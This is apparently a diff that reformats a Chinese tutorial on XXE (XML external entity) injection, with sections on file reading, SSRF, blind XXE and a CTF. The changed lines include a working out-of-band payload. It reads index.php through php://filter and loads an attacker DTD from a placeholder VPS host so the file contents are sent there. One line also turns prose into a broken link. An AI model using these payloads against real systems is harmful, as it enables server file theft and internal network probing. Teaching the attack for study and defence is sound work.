@@ -92,8 +92,6 @@ wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema l
 
 ![](https://thief.one/upload_image/20170620/1.png)
 
-
-
 利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。
 
 `<?xml version="1.0" encoding="utf-8"?>`
@@ -136,7 +134,7 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 ### 内网探测/SSRF
 
-由于xml实体注入攻击可以利用\`http://\`协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。
+由于xml实体注入攻击可以利用\`[http://\`协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。](http://`协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。)
 
 ## bind xxe
 
@@ -178,29 +176,27 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 整个的调用过程如下：解析时\`%dtd\`引入xxe.xml，之后\`%all\`引入\`send\`的定义，最后引用了实体send，把\`%file\`文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true%29\)
+![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true\)
 
 若要读取php等文件，同样需要先经过base64加密下。
 
-&lt;?xml version="1.0" encoding="utf-8"?&gt;
+`<?xml version="1.0" encoding="utf-8"?>`
 
-&lt;!DOCTYPE data \[
+`<!DOCTYPE data [`
 
-&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
+`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">`
 
-&lt;!ENTITY % dtd SYSTEM "[http://yourvps/xxe.xml"&gt](http://yourvps/xxe.xml"&gt);
+`<!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml">`
 
-%dtd; %all;
+`%dtd; %all;`
 
-\]&gt;
+`]>`
 
-&lt;value&gt;&send;&lt;/value&gt;
+`<value>&send;</value>`
 
-查看access.log:
+查看access.log:![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/5.jpg?raw=true)
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/5.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/5.jpg?raw=true%29\)
-
-\#\#\#\# payload2
+#### payload2
 
 发送的xml：
 
@@ -224,7 +220,7 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 xxe.xml中定义和引用了\`%payload2\`,在通过\`%dtd\`引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log:
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/6.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/6.jpg?raw=true%29\)
+![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/6.jpg?raw=true)
 
 # ctf
 
@@ -236,11 +232,11 @@ xxe.xml中定义和引用了\`%payload2\`,在通过\`%dtd\`引入xxe.xml后，�
 
 题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/7.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/7.jpg?raw=true%29\)
+![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/7.jpg?raw=true\)
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/8.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/8.jpg?raw=true%29\)
+![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/8.jpg?raw=true\)
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/9.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/9.jpg?raw=true%29\)
+![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/9.jpg?raw=true\)
 
 ## xxe相关WP
 
